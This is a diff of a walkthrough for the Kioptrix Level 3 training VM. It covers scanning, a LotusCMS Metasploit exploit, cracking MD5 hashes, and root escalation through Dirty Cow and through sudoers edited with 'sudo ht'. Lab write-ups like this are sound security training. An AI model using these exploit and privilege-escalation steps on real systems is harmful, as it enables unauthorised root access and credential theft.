@@ -1,6 +1,20 @@
 # Kioptrix Level 3
 
 ### Contents
+<!-- TOC -->
+- [Footprinting](#footprinting)
+- [Reconnaisance](#reconnaisance)
+  - [HTTP](#http)
+  - [phpMyAdmin](#phpmyadmin)
+  - [LotusCMS](#lotuscms)
+- [Initial Shell & Enumeration](#initial-shell--enumeration)
+- [Privilege Escalation I](#privilege-escalation-i)
+  - [Cracking Hashes](#cracking-hashes)
+- [Privilege Escalation II](#privilege-escalation-ii)
+  - [Alternative Routes](#alternative-routes)
+- [References](#references)
+
+<!-- /TOC -->
 
 Our target network is `10.0.2.0/24`.
 
@@ -50,7 +64,7 @@ OS details: Linux 2.6.9 - 2.6.33
 Now we proceed by examining each of the services on the machine.
 Starting with the most interesting.
 
-# HTTP
+## HTTP
 
 ```bash
 nikto -host kioptrix3.com
@@ -129,7 +143,7 @@ set URI /index.php?system=Admin
 exploit
 ```
 
-## Initial Shell
+# Initial Shell & Enumeration
 
 ```
 meterpreter > getuid
@@ -162,10 +176,16 @@ cat /home/loneferret/CompanyPolicy.README
 ```
 
 ```
-It is company policy to use 'sudo ht' to edit and view files.
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
 ```
 
-## MySQL
+# Privilege Escalation I
 
 We can see the daemon running:
 
@@ -216,4 +236,90 @@ john hashes.txt --format=Raw-MD5
 
 We find `loneferret:starwars` pretty quickly.
 
-We can then `ssh` into `kioptrix3`.
+We can then `ssh` into `loneferret@kioptrix3.com`.
+
+# Privilege Escalation II
+
+Based upon the Linux version we can see it is vulnerable to:
+https://www.exploit-db.com/exploits/40839, also known as **Dirty Cow**.
+
+We download the exploit onto Kali and then simply `scp` it across:
+
+```bash
+scp dirty.c loneferret@kioptrix3.com:/home/loneferret
+```
+
+We modified `dirty.c` so that we added a new user called `john`.
+
+```bash
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+```
+
+```
+etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password:
+Complete line:
+john:jobbj4Fd7EAng:0:0:pwned:/root:/bin/bash
+
+mmap: b7fe0000
+```
+
+We can login as `john`:
+
+```bash
+su john
+john@Kioptrix3:~
+cat Congrats.txt
+```
+
+```
+Good for you for getting here.
+Regardless of the matter (staying within the spirit of the game of course)
+you got here, congratulations are in order. Wasn't that bad now was it.
+
+Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intented for everyone.
+Difficulty is relative, keep that in mind.
+
+The object is to learn, do some research and have a little (legal)
+fun in the process.
+
+
+I hope you enjoyed this third challenge.
+```
+
+## Alternative Routes
+
+We took a slight shortcut here using Dirty Cow, other routes exist.
+
+The primary alternative is to use the `ht` program mentioned in the README.
+
+Using `sudo ht` we can edit and read any file. For example, we could have edited `sudoers` to gain root as follows:
+
+```bash
+sudo ht /etc/sudoers
+```
+
+Then make sure the existing `loneferret` line looks like:
+
+```
+loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/sh
+```
+
+The simply:
+
+```bash
+sudo /bin/sh
+```
+
+# References
+
+
+[Computerphile Dirty Cow Explanation](https://www.youtube.com/watch?v=CQcgz43MEZg)
+
+[Shadow file formats](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)
+
+[Configuring the sudoers file](https://www.linux.com/blog/configuring-linux-sudoers-file)
